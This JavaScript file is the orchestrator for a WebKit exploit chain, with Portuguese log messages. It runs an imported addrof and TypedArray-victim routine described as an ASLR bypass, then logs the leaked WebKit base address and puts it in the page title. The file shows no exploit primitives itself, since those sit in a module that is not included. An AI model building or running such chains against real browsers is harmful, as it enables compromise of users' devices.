// js/script3/runAllAdvancedTestsS3.mjs (Final - Orquestrador para UltimateExploit)
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
import { getRunBtnAdvancedS3 } from '../dom_elements.mjs';

import {
    executeTypedArrayVictimAddrofAndWebKitLeak_R43 as runFinalExploit,
    FNAME_MODULE_ULTIMATE
} from './UltimateExploit.mjs';

async function runFinalBypassStrategy() {
    const FNAME_RUNNER = "runFinalBypassStrategy"; 
    logS3(`==== INICIANDO ESTRATÉGIA DE BYPASS DE ASLR ====`, 'test', FNAME_RUNNER);
    
    const result = await runFinalExploit();

    if (result && result.success) {
        logS3(`  RUNNER: SUCESSO! A cadeia de exploração foi concluída.`, "good", FNAME_RUNNER);
        logS3(`  > Base do WebKit Vazada: ${result.webkit_base}`, "vuln", FNAME_RUNNER);
        document.title = `SUCESSO! Base: ${result.webkit_base}`;
    } else {
        logS3(`  RUNNER: FALHA na cadeia de exploração.`, "critical", FNAME_RUNNER);
        logS3(`  > Mensagem Final: ${result?.error || 'Erro desconhecido.'}`, "critical", FNAME_RUNNER);
        document.title = `${FNAME_MODULE_ULTIMATE}: Exploit FAIL!`;
    }
    
    logS3(`  Título da página final: ${document.title}`, "info", FNAME_RUNNER);
    await PAUSE_S3(MEDIUM_PAUSE_S3);
    logS3(`==== ESTRATÉGIA DE BYPASS CONCLUÍDA ====`, 'test', FNAME_RUNNER);
}

export async function runAllAdvancedTestsS3() {
    const FNAME_ORCHESTRATOR = `${FNAME_MODULE_ULTIMATE}_MainOrchestrator`;
    logS3(`==== INICIANDO Script Final (${FNAME_ORCHESTRATOR}) ... ====`, 'test', FNAME_ORCHESTRATOR);
    
    await runFinalBypassStrategy();
    
    logS3(`\n==== Script Final (${FNAME_ORCHESTRATOR}) CONCLUÍDO ====`, 'test', FNAME_ORCHESTRATOR);
    const runBtn = getRunBtnAdvancedS3(); if (runBtn) runBtn.disabled = false;
}
